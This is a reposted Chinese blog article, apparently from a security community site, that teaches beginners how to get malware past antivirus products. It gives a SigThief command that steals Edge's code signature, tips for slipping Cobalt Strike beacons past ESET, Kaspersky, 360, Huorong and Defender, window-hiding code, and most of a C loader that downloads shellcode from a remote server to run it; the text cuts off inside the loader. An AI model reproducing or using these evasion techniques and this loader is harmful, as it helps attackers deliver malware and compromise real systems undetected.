---
title: 【转载】免杀手法大总结(入门)
url: https://mp.weixin.qq.com/s/1k1wklQXyVprOSIRBp2a0A
source: Doonsec's feed
date: 2026-04-11
fetch_date: 2026-04-12T04:46:58.752598
---

# 【转载】免杀手法大总结(入门)

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/DJX1rNqJe4lIXTNnbdbGvhiapicyJYSx49X9ohOW39FeXHaGvzicRLHGdO8Lvibibw4We19znjsDCiaFxxtWBNsptXCEbRzUpnFZwrOuFJ0rGe914/0?wx_fmt=jpeg)

# 【转载】免杀手法大总结(入门)

隐雾安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

好文推荐

文章作者：先知社区(小新07)

文章来源：https://xz.aliyun.com/news/13652

# 前言

这是这段时间入门免杀的一些尝试，集合了我觉得目前还算比较有用的一些方法，也算可供师傅们入门免杀的时候的一些思路，如有不当之处，望指正。

## 0.零散知识

### 0x00 添加图标：

尝试了几种大众方法，感觉还是这篇文章的方法好用
https://www.sqlsec.com/2020/10/csexe.html#%E6%B7%BB%E5%8A%A0%E5%9B%BE%E6%A0%87

### 0x01 添加签名：

sigthief下载地址：https://github.com/secretsquirrel/SigThief
`python sigthief.py -i "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" -t C:\Users\xx\Desktop\Project1.exe -o 1.exe`

### 0x02 降低熵值

熵值也是一些杀软查杀的条件之一，把shellcode和loader分开能有效降低熵值

### 0x03 免杀入门杂谈文章推荐

* https://xz.aliyun.com/t/13332?time\_\_1311=mqmxnDBG0QiQPGNDQ0KBKg77x9YreDcjYoD&alichlgref=https%3A%2F%2Fxz.aliyun.com%2F%3Fpage%3D3
* https://myzxcg.com/archives/
* 浅析杀软系列：https://0range-x.github.io/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/
* 闲谈免杀：https://cloud.tencent.com/developer/article/2368173
* 加载器总结：https://www.cnblogs.com/henry666/p/17429771.html
* https://www.cnblogs.com/fdxsec/p/17827348.html
* 回调函数加载器总结：https://www.freebuf.com/articles/web/269158.html
* 免杀技术汇总：https://blog.csdn.net/jentle8/article/details/126771022

### 0x05 隐藏窗口

**360会检测这个，例如远程加载shellcode360不会杀，但是加上隐藏窗口会杀，但是我们必须隐藏窗口，所以只能另外修改其他特征，例如隐藏窗口加上远程加载加上异常处理就不会杀**
1.`ShowWindow(GetConsoleWindow(), SW_HIDE);`
2.`#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")`
3.我们将主函数改成WinMain，几个参数意义如下：

* hInstance：当前实例的句柄。
* hPrevInstance：先前实例的句柄，在现代的Windows系统中这个参数总是NULL。
* lpCmdLine：命令行参数，是一个指向以空字符结尾的字符串的指针。
* nCmdShow：指定窗口应该以何种形式显示。

```
#include <Windows.h>
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // ... 其他初始化工作 ...

  // 创建窗口并显示
  HWND hWnd = CreateWindow(/* 创建窗口的参数 */);
  ShowWindow(hWnd, SW_HIDE);  // 将窗口隐藏起来
    return 0;
}
```

### 0x06 nt、zw等底层函数查询网站

http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FMemory%20Management%2FVirtual%20Memory%2FNtProtectVirtualMemory.html

## 1.杀软总结

参考了橘神的文章和自己的尝试，橘神的博客就是上面浅析杀软系列那一篇。

### 1x0 eset

* 上线方面

loader使用shellcode分离的方式

* 操作方面

不是企业版没碰到有拦截一些常规操作，eset是一个对行为操作极其敏感的杀软。所以在对抗行为检测类杀软的时候，cs尽量使用模块化插件的方式去获取cmd或者pw回显信息。

### 1x1 卡巴斯基

内存扫描能力很强，默认的cs beacon会被检测

* 上线方面

修改cs的profile，卡巴接触不多，我也没办法多说什么

* 操作方面

常规操作是不拦截的

### 1x2 火绒

* 上线方面

没啥注意，火绒有本地沙箱内置了一个本地的虚拟化环境，但是感觉火绒沙箱稍微好过

* 操作方面

不要去做一些乱搞的配置，很容易绕过，不要随意使用提权工具
心跳间隔不要过短

### 1x3 360

* 360核心防护

开启了核晶防护之后，需要操作是受限的，大部分的CMD命令是无法使用的，判断是否开启核晶防护，上传EXE执行提升拒绝访问，就算上线了，becaon下运行cmd命令提示拒绝访问

* 上线方面

如果有核晶防护，DLL白加黑解决上线问题

* 操作方面

即便有system权限也没办法实现CMD命令注入，就上传我们自己写好的代码进行注入，或者用bof插件进行相关的替代

### 1x4 windows defender

**Defender两个核心: AMSI、ETW。**

* 上线方面

**沙箱检测动态查杀有点强，感觉shellcode传到内存一解密就杀，火绒360还不会**
针对cs,不要使用stager shellcode ，使用stage shellcode 上线是要立刻被干掉的，用stageless的shellcode。

* 操作方面

如果出发恶意行为，如提权之类的，会关联到loader程序，上线后可以注入到另外的进程去操作，
使用cs内置的execute-assembly 可能会导致beacon掉线，原因：C#的程序本身是不免杀的，会经过ASMI的扫描

### 1x5 其他杀软

* sangfor edr： 静态查杀很强，不会查杀父进程，过了静态就可以乱来
* 麦咖啡： 麦咖啡静态查杀也很强，没有行为查杀
* 阿里安骑士：静态一般，但**拦截高危cmd操作**
* 趋势科技：**监控恶意服务创建**，行为检测基本无
* G01：静态上传不管是exe还是dll都会被杀，有黑名单机制

## 2.静态绕过

## 2x0 远程分段加载shellcode

我最经常使用的一种静态绕过的方法

### 效果：

能过火绒360动静态，但是一些添加用户的命令依然会拦截
加上隐藏窗口360免不了，火绒还是可以

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmibNSiaibZcCEHKWeQL1bTEFS29LSEC9fPDPEPCjY2aafz8f45s0u8lPF2Ff4rQouRf86gII36F9ibWQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=0)

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicmibNSiaibZcCEHKWeQL1bTEFS6ZRfttPS6fsvOslRFlkdojTynedbQXUvhYN4nBYjFiaeJRTibPAhUvqQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=1)

```
#include <winsock2.h>#include <ws2tcpip.h>#include <Windows.h>#include <stdio.h>#pragma comment(lib, "ntdll")#pragma comment (lib, "Ws2_32.lib")#pragma comment (lib, "Mswsock.lib")#pragma comment (lib, "AdvApi32.lib")#define NtCurrentProcess()     ((HANDLE)-1)#define DEFAULT_BUFLEN 4096#ifndef NT_SUCCESS#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)#endifLPVOID shellcode_addr;DWORD getShellcode_Run(char* host, char* port, char* resource,OUT char* recvbuf_ptr) {    DWORD oldp = 0;    BOOL returnValue;    size_t origsize = strlen(host) + 1;    const size_t newsize = 100;    size_t convertedChars = 0;    wchar_t Whost[newsize];    mbstowcs_s(&convertedChars, Whost, origsize, host, _TRUNCATE);    WSADATA wsaData;    SOCKET ConnectSocket = INVALID_SOCKET;    struct addrinfo* result = NULL,    * ptr = NULL,    hints;    char sendbuf[MAX_PATH] = "";    lstrcatA(sendbuf, "GET /");    lstrcatA(sendbuf, resource);    char recvbuf[DEFAULT_BUFLEN];    memset(recvbuf, 0, DEFAULT_BUFLEN);    int iResult;    int recvbuflen = DEFAULT_BUFLEN;    // Initialize Winsock    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);    if (iResult != 0) {        printf("WSAStartup failed with error: %d\n", iResult);        return 0;    }    ZeroMemory(&hints, sizeof(hints));    hints.ai_family = PF_INET;    hints.ai_socktype = SOCK_STREAM;    hints.ai_protocol = IPPROTO_TCP;    // Resolve the server address and port    iResult = getaddrinfo(host, port, &hints, &result);    if (iResult != 0) {        printf("getaddrinfo failed with error: %d\n", iResult);        WSACleanup();        return 0;    }    // Attempt to connect to an address until one succeeds    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {        // Create a SOCKET for connecting to server        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,            ptr->ai_protocol);        if (ConnectSocket == INVALID_SOCKET) {            printf("socket failed with error: %ld\n", WSAGetLastError());            WSACleanup();            return 0;        }        // Connect to server.        printf("[+] Connect to %s:%s", host, port);        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);        if (iResult == SOCKET_ERROR) {            closesocket(ConnectSocket);            ConnectSocket = INVALID_SOCKET;            continue;        }        break;    }    freeaddrinfo(result);    if (ConnectSocket == INVALID_SOCKET) {        printf("Unable to connect to server!\n");        WSACleanup();        return 0;    }    // Send an initial buffer    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);    if (iResult == SOCKET_ERROR) {        printf("send failed with error: %d\n", WSAGetLastError());        closesocket(ConnectSocket);        WSACleanup();        return 0;    }    printf("\n[+] Sent %ld Bytes\n", iResult);    // shutdown the connection since no more data will be sent    iResult = shutdown(ConnectSocket, SD_SEND);    if (iResult == SOCKET_ERROR) {        printf("shutdown failed with error: %d\n", WSAGetLastError());        closesocket(ConnectSocket);        WSACleanup();        return 0;    }    memset(recvbuf_ptr,0,400000);    DWORD total_received = 0;    // Receive until the peer closes the connection    do {        iResult = recv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);        if (iResult > 0)        {            printf("[+] Received %d Bytes\n", iResult);            memcpy(recvbuf_ptr, recvbuf, iResult);            recvbuf_ptr += iResult; // 将指针移动到接收到的数据的末尾            total_received += iResult; // 更新接收到的总字节数            printf("[+] Received total %d Bytes\n", total_received);        }        else if (iResult == 0)            printf("[+] Connection closed\n");        else            printf("recv failed with error: %d\n", WSAGetLastError());        //RunShellcode(recvbuf, recvbuflen);    } while (iResult > 0);    // cleanup    closesocket(ConnectSocket);    WSACleanup();    return total_received;}int main(int argc, char** argv) {    // Validate the parameters   /* if (argc != 4) {        printf("[+] Usage: %s <RemoteIP> <RemotePort> <Resource>\n", argv[0]);        return 1;    }*/    char* recvbuf_ptr = (char*)malloc(400000);    char...